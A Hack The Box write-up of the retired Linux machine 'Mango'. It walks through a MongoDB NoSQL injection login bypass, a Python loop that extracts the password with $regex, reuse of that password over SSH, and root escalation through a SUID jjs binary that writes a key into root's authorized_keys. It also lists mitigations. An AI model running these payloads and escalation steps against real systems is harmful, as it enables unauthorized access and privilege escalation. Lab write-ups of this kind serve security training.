---
machine: Mango
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, nosql, mongodb, sudo, jjs]
---

# Mango — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The `staging-order.mango.htb` vhost uses MongoDB and accepts operators at login. A `[$ne]` bypass grants access and a `$regex` extracts the username and password character by character. That password is reused over SSH for `mango` and `admin`, and a SUID `jjs` reads files and writes a key into root's `authorized_keys`.

## Recon

```bash
nmap -Pn -sCV -p22,80,443 <IP>
```

- `22/tcp` OpenSSH on Ubuntu 18.04.
- `80/tcp` returns `403`; `443/tcp` serves a site and a certificate for `staging-order.mango.htb`.
- The staging vhost is the real application; the rest is a landing page.

## Enumeration

- The login sends `username`, `password` and `login` via `POST`.
- `username[$ne]=x&password[$ne]=x` redirects to `/home.php`, confirming NoSQL injection.
- The `password[$regex]` field compares prefixes and extracts the full value.

## Foothold

Automate `$regex` extraction for `admin` and recover the password. Other database users can be enumerated too. The password works over SSH for `mango`; `admin` is blocked by `AllowUsers`, but `su` works.

```python
import requests, string
for c in string.printable:
    r = requests.post('http://staging-order.mango.htb/',
        data={'username':'admin','password[$regex]':'^'+prefix+c+'.*','login':'login'})
```

## Lateral movement

`mango` and `admin` share the password extracted from the database. `mango` logs in over SSH and `admin` is reached with `su`, giving access to the user flag and a second context for SUID enumeration.

## Privilege escalation

`/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs` is SUID and belongs to the `admin` group. Nashorn reads `/root/root.txt` or writes a public key into `/root/.ssh/authorized_keys`.

```bash
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
jjs> var FileWriter = Java.type("java.io.FileWriter");
jjs> var fw = new FileWriter("/root/.ssh/authorized_keys");
jjs> fw.write("<PUBLIC_KEY>");
jjs> fw.close();
```

## Evidence

- Redirect to `/home.php` with `[$ne]`.
- Password extracted with `$regex` and SSH session as `mango`.
- SUID `jjs` and root access.

## Lessons learned

- Passing arrays to a NoSQL driver changes query semantics.
- Uniform login errors do not prevent a boolean oracle.
- A SUID interpreter such as `jjs` is a direct path to privileged read and write.

## Mitigation and detection

- Validate that username and password are strings, not objects.
- Use parameterized queries and limit accepted operators.
- Remove unnecessary SUID bits and restrict scripting interpreters.

## References

- [0xdf — Mango](https://0xdf.gitlab.io/2020/04/18/htb-mango.html)
- [IppSec — Mango](https://www.youtube.com/watch?v=NO_lsfhQK_s)
- [Hack The Box — Mango](https://app.hackthebox.com/machines/mango)
